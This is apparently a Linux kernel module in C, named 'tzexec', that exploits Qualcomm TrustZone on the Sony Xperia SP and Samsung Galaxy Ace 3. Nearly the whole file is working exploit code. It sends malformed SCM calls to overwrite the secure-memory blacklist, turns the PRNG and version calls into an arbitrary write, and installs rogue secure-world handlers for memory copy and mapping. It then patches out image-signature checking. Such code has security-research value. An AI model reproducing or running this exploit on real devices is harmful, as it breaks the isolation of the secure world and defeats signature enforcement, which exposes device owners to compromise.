#include <linux/init.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/mutex.h>
#include <linux/errno.h>
#include <linux/err.h>
#include <linux/init.h>
#include <linux/elf.h>
#include <mach/scm.h>
#include <asm/cacheflush.h>

MODULE_LICENSE("Dual BSD/GPL");

struct elf_info_s
{
  Elf32_Ehdr  *elf_hdr;
  Elf32_Phdr  *prog_hdr;
  u32      prog_hdr_num;
  u8*      hash_seg;
  u32      hash_seg_sz;
  u8*      sig_ptr;
  u32      sig_sz;
  u8*      cert_ptr;
  u32      cert_sz;
};

typedef u32 tz_mutex_t;

struct pil_info_s {
  struct elf_info_s elf_info;
  u32 proc;
  tz_mutex_t lock;
  u32 state;
  void *ssd;
};
#ifndef __MSM_SCM_PAS_H
enum pas_id {
	PAS_MODEM,
	PAS_Q6,
	PAS_DSPS,
	PAS_TZAPPS,
	PAS_MODEM_SW,
	PAS_MODEM_FW,
	PAS_WCNSS,
	PAS_SECAPP,
	PAS_GSS,
	PAS_VIDC,
};
#endif

#define SONY_XPERIA_SP
//#define SAMSUNG_ACE_3

/* symbols */
#ifdef SAMSUNG_ACE_3
/* samsung galaxy ace 3 */
#define BLIST_ADDR		0x2A025158
#define BLIST_INDEX		4
/* #define CLOBBER_ADDR	(BLIST_ADDR + 4*16 + 4) */

#define FEATURE_LIST 		0x2A02500C

#define TZ_SECTION_2		0x2A025CBC
#define TZ_SECTION_2_ORIG	{0x2A02749C, 0x2A0279C4}

#define TZ_MEMCPY 		(0x2A019558|1)
#define TZ_MMU_MAP		(0x2A003AB8|1)

#define TZ_SIGN_ADDR		0x2A02514B 

#elif defined (SONY_XPERIA_SP)
/* as seen in sony xperia sp Boot partition */
#define BLIST_ADDR		0x2A02C1E0
#define BLIST_INDEX		8

#define FEATURE_LIST		0x2A02C15C

#define TZ_SECTION_2		0x2A02CDDC
#define TZ_SECTION_2_ORIG	{0x2A02E89C, 0x2A02EE38}

#define TZ_MEMCPY		(0x2A0208D0|1)
#define TZ_MMU_MAP		(0x2A001F12|1)

/* needed for manual image loading */
#define TZ_DCACHE_INVAL		(0x2A020FC8)
#define TZ_MUTEX_LOCK		(0x2A0237FC)
#define TZ_MUTEX_UNLOCK		(0x2A023848)
#define TZ_CLEAN_PIL		(0x2A002E12|1)
#define TZ_IS_ELF		(0x2A002E2C|1)
#define TZ_POPULATE_ELF		(0x2A00299C|1)
#define TZ_VIDC_CONFIG		(0x2A008DFA|1)
#define TZ_DSPS_CONFIG		(0x2A008C4A|1)

#define MANUAL_INIT_IMAGE

#define PIL_INFO_ADDR		0x2A02F480
#define pil_info		((struct pil_info_s*)(PIL_INFO_ADDR))
#else
#error "no target selected"
#endif

/* commons */
#define TZ_PIL_LOCK(id)		tz_mutex_lock(&pil_info[id].lock)
#define TZ_PIL_UNLOCK(id)	tz_mutex_unlock(&pil_info[id].lock)
#define CLOBBER_ADDR		(BLIST_ADDR + 16*BLIST_INDEX+4)
#define BLIST_ORIG		{2, 0x28420000, 0x2A03F000}

#define TZ_LOG(fmt, ...)		printk(KERN_ALERT "tzexec: " fmt "\n", ##__VA_ARGS__)
// #define TZ_DEBUG(fmt, ...)	TZ_LOG(fmt, ##__VA_ARGS__)
#define TZ_DEBUG(fmt, ...)	{}

/** scm utils
 */
#define TZ_SID(svc,cmd) (((svc&0x3f)<<10)|(cmd&0x3f))

struct scm_command {
  u32 len;
  u32 buf_offset;
  u32 resp_hdr_offset;
  u32 id;
  u32 buf[0];
};

struct scm_sc_s
{
  u32 id;
  u32 name;
  u32 flags;
  u32 func;
  u32 nargs;
  u32 args[4];
};

struct mmu_block_s
{
  u32 p_addr;
  u32 v_addr;
  u32 n_pages;
  u32 flags;
};

#define SCM_INTERRUPTED		1
static u32 smc(u32 cmd_addr)
{
	int context_id;
	register u32 r0 asm("r0") = 1;
	register u32 r1 asm("r1") = (u32)&context_id;
	register u32 r2 asm("r2") = cmd_addr;
	do {
		asm volatile(
			__asmeq("%0", "r0")
			__asmeq("%1", "r0")
			__asmeq("%2", "r1")
			__asmeq("%3", "r2")
#ifdef REQUIRES_SEC
			".arch_extension sec\n"
#endif
			"smc	#0	@ switch to secure world\n"
			: "=r" (r0)
			: "r" (r0), "r" (r1), "r" (r2)
			: "r3");
	} while (r0 == SCM_INTERRUPTED);

	return r0;
}

/* writes {0xc, 0xc, 0x1} at paddr */
static int
clobber_it(u32 paddr)
{
  int ret;
  struct scm_command *scm_buf;
  u32 cmd_addr;

  scm_buf = kzalloc(PAGE_ALIGN(0x40), GFP_KERNEL);
  if (!scm_buf){
    TZ_LOG("no mem");
    return -ENOMEM;
  }
  cmd_addr = virt_to_phys(scm_buf);

  scm_buf->id = TZ_SID(1, 3);
  scm_buf->len = 0xfffff000;
  scm_buf->buf_offset = 0xffffe000;
  scm_buf->resp_hdr_offset = paddr - cmd_addr;

  if (scm_buf->len <= 16){
      TZ_LOG( "invalid buf len %08x", scm_buf->len);
  }
  if (scm_buf->buf_offset > scm_buf->len || scm_buf->buf_offset < 16){
      TZ_LOG( "invalid buf offset %08x", scm_buf->buf_offset);
  }
  flush_cache_all();
  ret = smc(cmd_addr);
  TZ_LOG( "scm_call(1,3, len %x, bof %x, rof %x (raddr %x)) -> %d ",
	scm_buf->len, scm_buf->buf_offset, scm_buf->resp_hdr_offset,
	scm_buf->resp_hdr_offset + cmd_addr, ret);
  kfree(scm_buf);

  return ret;
}

/* check wether a scm call is available */
static int
scm_call_usable(u32 sid)
{
    u32 *buf;
    int ret;

    buf = kzalloc(PAGE_ALIGN(sizeof(*buf)), GFP_KERNEL);
    if (!buf){
        return -ENOMEM;
    }
    flush_cache_all();
    ret = scm_call_atomic3(6, 1, sid, virt_to_phys(buf), 4);
    if (ret == 0) 
        ret = (int)*buf;
    else
       TZ_LOG( "call_usable: error %x", (unsigned)ret);
    kfree(buf);

    return ret;
}

/* Reads version[id]*/
static int
get_version(u32 id, u32 paddr)
{
  int ret;

  flush_cache_all();
  ret = scm_call_atomic3(6, 3, id, paddr, 4 );
  flush_cache_all();

  return ret;
}

/* Writes size bytes of random in paddr */
static int
do_prng(u32 paddr, u32 size)
{
  int ret;

  flush_cache_all();
  ret = scm_call_atomic2(10, 1, paddr, size );

  return ret;
}

/* Use prng to write 4 bytes in version[id]*/
static int
write_version(u32 id, u32 val)
{
    int rc;
    u32 waddr, raddr, i;
    u8 *buf, *vb = (u8*)&val;

    rc = 0;

    buf = kzalloc(PAGE_ALIGN(4), GFP_KERNEL);
    if (!buf){
       TZ_LOG( "no mem");
       return -ENOMEM;
    }
    waddr = FEATURE_LIST + 4 + id*8;
    raddr = virt_to_phys(buf);

    for (i=0;i<4;i++){
        while(1){
	    if ((rc = get_version(id, raddr))!= 0){
	       TZ_LOG("get_version failed");
	       goto ret;
	    }
            if (buf[i] == vb[i])
                break;
	    if ((rc = do_prng(waddr+i, 1))!=0){
	        TZ_LOG("do_pring(0x%08x, 1) failed", waddr+i);
                goto ret;
	    }
        }
    }
    
ret:
    kfree(buf);

    return rc;
}

/* write 4 bytes */
static int
write4(u32 paddr, u32 val)
{
  int rc;

  /* set version[0] to write val */
  if ((rc = write_version(0, val)))
    return rc;

  /* write version[0] to target addr */
  return get_version(0, paddr);
}

int
tz_mmu_map( u32 p_addr, u32 v_addr, u32 n_pages, u32 flags )
{
  TZ_LOG("mmu_map");
  return scm_call_atomic4_3(30, 32, p_addr, v_addr, n_pages, flags, NULL, NULL);
}
EXPORT_SYMBOL(tz_mmu_map);

int
tz_memcpy(u32 dst, u32 src, u32 size)
{
  int rc;

  flush_cache_all();
  rc = scm_call_atomic3(30, 33, dst, src, size);

  return rc;
}
EXPORT_SYMBOL(tz_memcpy);

/* wrapper to copy data to trustzone secure memory */
int
copy_to_tz(u32 dst, const void* src, u32 size)
{
  u8 *buf;

  buf = kzalloc(PAGE_ALIGN(size), GFP_KERNEL);
  if (!buf){
    TZ_LOG( "no mem");

    return -ENOMEM;
  }
  memcpy(buf, src, size);
  tz_memcpy(dst, virt_to_phys(buf), size);
  kfree(buf);

  return 0;
}
EXPORT_SYMBOL(copy_to_tz);

int
copy_from_tz(void* dst, u32 src, u32 size)
{
  u8 *buf;

  buf = kzalloc(PAGE_ALIGN(size), GFP_KERNEL);
  if (!buf)
    return -ENOMEM;

  tz_memcpy(virt_to_phys(buf), src, size);
  memcpy(dst, buf, size);
  kfree(buf);

  return 0;
}
EXPORT_SYMBOL(copy_from_tz);

#ifdef MANUAL_INIT_IMAGE
void
tz_dcache_inval (void *addr, u32 size)
{
  TZ_DEBUG("dcache_inval");
  scm_call_atomic2(30, 34, (u32) addr, size);
}

void
tz_mutex_lock (tz_mutex_t *lock)
{
  TZ_DEBUG("mutex_lock");
  scm_call_atomic1(30, 35, (u32)lock);
}

void
tz_mutex_unlock (tz_mutex_t *lock)
{
  TZ_DEBUG("mutex_unlock");
  scm_call_atomic1(30, 36, (u32) lock);
}

void
tz_clean_pil (struct pil_info_s *pil)
{
  TZ_DEBUG("clean_pil");
  scm_call_atomic1(30, 37, (u32)pil);
}

int
tz_is_elf (Elf32_Ehdr * ehdr)
{
  TZ_DEBUG("is_elf");
  return scm_call_atomic1(30, 38, (u32)ehdr);
}

int
tz_populate_elf (u32 proc, Elf32_Ehdr *ehdr)
{
  TZ_DEBUG("populate elf");
  return scm_call_atomic3(30, 39, proc, (u32)ehdr, (u32)&pil_info[proc].elf_info);
}

void
tz_dsps_config (void)
{
  TZ_DEBUG("dsps_config");
  scm_call_atomic1 (30, 40, 0);
}

void
tz_vidc_config (void)
{
  TZ_DEBUG("vidc_config");
  scm_call_atomic1 (30, 41, (u32) &pil_info[PAS_VIDC].elf_info);
}

int
tz_manual_init_image(u32 proc, u32 elf_paddr)
{
  const u32 st_reset = 2, dsps_entry = 0x12000000;
  Elf32_Ehdr *dsps_elf, *elf = (Elf32_Ehdr*) elf_paddr;
  int rc = 0;

  TZ_LOG("init_image(%d, 0x%x)", proc, elf_paddr);

  tz_dcache_inval(elf, sizeof(*elf));
  do {
    TZ_PIL_LOCK(4);
    tz_clean_pil(&pil_info[proc]);

    if (!tz_is_elf(elf)){
      TZ_LOG("not an elf ?!");
      rc = -1;
      break;
    }
    if ((rc = tz_populate_elf(proc, elf))){
      TZ_LOG("populo failed: %d", rc);
      break;
    }
    switch(proc){
    case PAS_DSPS:
      tz_dsps_config();
      copy_from_tz(&dsps_elf, (u32)&pil_info[proc].elf_info.elf_hdr, 4);
      TZ_LOG("dsps elf_ptr : %x", (u32)dsps_elf);
      copy_to_tz((u32)&dsps_elf->e_entry, &dsps_entry, 4);
      break;
    case PAS_VIDC:
      tz_vidc_config();
      break;
    default:
      break;
    }
  } while (0);
  if (!rc){
    copy_to_tz((u32)&pil_info[proc].state, &st_reset, 4);
  }
  else{
    tz_clean_pil(&pil_info[proc]);
  }
  TZ_PIL_UNLOCK(4);
  TZ_LOG("all done, rc = %d", rc);

  return rc;
}
EXPORT_SYMBOL(tz_manual_init_image);
#endif

static struct scm_sc_s *scm_sc = NULL;
static struct scm_sc_s scm_sc_def[] = {
   {TZ_SID(30, 32), 0, 0xd, TZ_MMU_MAP,	4, {4, 4, 4, 4}},
   {TZ_SID(30, 33), 0, 0xd, TZ_MEMCPY,	3, {4, 4, 4}},
#ifdef MANUAL_INIT_IMAGE
   {TZ_SID(30, 34), 0, 0xd, TZ_DCACHE_INVAL,	2, {4, 4}},
   {TZ_SID(30, 35), 0, 0xd, TZ_MUTEX_LOCK,	1, {4}},
   {TZ_SID(30, 36), 0, 0xd, TZ_MUTEX_UNLOCK,	1, {4}},
   {TZ_SID(30, 37), 0, 0xd, TZ_CLEAN_PIL,	1, {4}},
   {TZ_SID(30, 38), 0, 0xd, TZ_IS_ELF,		1, {4}},
   {TZ_SID(30, 39), 0, 0xd, TZ_POPULATE_ELF,	3, {4}},
   {TZ_SID(30, 40), 0, 0xd, TZ_DSPS_CONFIG,	1, {4}},
   {TZ_SID(30, 41), 0, 0xd, TZ_VIDC_CONFIG,	1, {4}},
#endif
};

/* Remove custom handlers */
static void
free_handlers(void)
{
  static const u32 orig_sec2[] = TZ_SECTION_2_ORIG;

  if (!scm_sc)
    return;

  /* restore section */
  copy_to_tz(TZ_SECTION_2, orig_sec2, sizeof(orig_sec2));

  /* free mem */
  kfree(scm_sc);
  scm_sc = NULL;
}

/* Add custom handlers */
static int
init_handlers(void)
{
  static const u32 orig_map[] = BLIST_ORIG;
  u32 index, i, paddr, rc;
  struct scm_sc_s *h;

  /* Get new section size, check sanity of tzsids */
  for (h=scm_sc_def, index=0, i=0; i<ARRAY_SIZE(scm_sc_def); i++,h++)
  {
      if (scm_call_usable(h->id) == 1){
          TZ_LOG( "error: scm call %x already usable", h->id);

          return -EINVAL;
      }
      index += offsetof(struct scm_sc_s, args) + 4 *h->nargs;
      TZ_LOG( "%4x | of %d | idx %d", h->id, offsetof(struct scm_sc_s, args), index);
  }
  TZ_LOG("total size: %d", index);
  if (scm_sc){
      TZ_LOG( "handlers already init");

      return -1;
  }
  /* Clear secure_memory blacklist. */
  if ((rc=clobber_it(CLOBBER_ADDR))){
    TZ_LOG( "clobber failed");
 
    return rc;
  }

  /* Alloc mem for section */
  if (!(scm_sc = kzalloc(PAGE_ALIGN(index), GFP_KERNEL)))
     return -ENOMEM;

  /* copy handlers */
  for (h=scm_sc_def, index=0, i=0; i<ARRAY_SIZE(scm_sc_def); i++,h++)
  {
      memcpy((u8*)scm_sc + index, (u8*)h, offsetof(struct scm_sc_s, args)+4*h->nargs);
      TZ_LOG( "scm_hdlr[%d] = %x %x", i, h->id, h->func); 
      index += offsetof(struct scm_sc_s, args) + 4 *h->nargs;
  }
  /* write section */  
  paddr = virt_to_phys(scm_sc);
  write4(TZ_SECTION_2 + 4, paddr + index);
  write4(TZ_SECTION_2, paddr);

  /* check all ready */
  for (h=scm_sc_def, i=0 ; i<ARRAY_SIZE(scm_sc_def); i++,h++)
  {
      if (scm_call_usable(h->id)!=1){
         TZ_LOG( "call %x not usable", h->id); 
         free_handlers();

         return -1;
      }
  }
  /* Restore secure_memory blacklist. */
  copy_to_tz(CLOBBER_ADDR, orig_map, 12);
  
  return 0;
}

int __init tzexec_init(void)
{
  int rc = 0;

  TZ_LOG("tzexec starting");

  /* Add custom smc handlers */
  if ((rc=init_handlers())){
    TZ_LOG( "init failed");
    return 0;
  }

#ifdef TZ_SIGN_ADDR
  /* generic signing disabling */
  copy_to_tz(TZ_SIGN_ADDR, "\x00\x01", 2);
  TZ_LOG("signing gone ?!");
#endif

  return 0;
}

void __exit tzexec_exit(void)
{
  free_handlers();
  TZ_LOG("ciao bella");
}

module_init(tzexec_init);
module_exit(tzexec_exit);
